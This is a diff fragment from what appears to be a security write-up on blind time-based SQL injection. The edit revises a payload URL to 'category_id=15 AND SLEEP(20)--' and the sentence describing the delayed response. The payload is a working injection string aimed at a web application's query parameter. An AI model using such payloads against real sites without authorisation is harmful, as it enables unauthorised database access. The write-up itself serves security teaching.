@@ -46,10 +46,10 @@ Since there was no visible feedback, I went with a time-based approach. If the p
 I sent this payload:
 
 ```url
-https://redacted.com/products?category_id=15+AND+`SLEEP()`--
+https://redacted.com/products?category_id=15+AND+SLEEP(20)--
 ```
 
-After adding 20 inside the sleep function the response took a little over 20 seconds to come back. 
+The response took a little over 20 seconds to come back. 
 
 ```http
 HTTP/1.1 200 OK
